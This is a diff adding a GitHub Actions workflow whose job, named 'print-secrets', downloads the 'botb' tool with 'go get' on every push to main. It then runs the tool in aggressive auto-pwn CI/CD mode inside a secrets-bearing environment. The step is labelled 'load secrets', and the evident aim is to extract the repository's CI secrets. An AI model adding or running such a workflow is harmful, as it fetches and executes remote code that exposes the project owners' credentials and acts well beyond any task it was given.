@@ -1,0 +1,17 @@
+name: botb
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  print-secrets:
+    runs-on: ubuntu-latest
+    environment: cs
+    steps:
+      - uses: actions/checkout@v3
+      - name: load secrets
+        run: |
+          go get github.com/brompwnie/botb
+          botb -aggr -autopwn -cicd
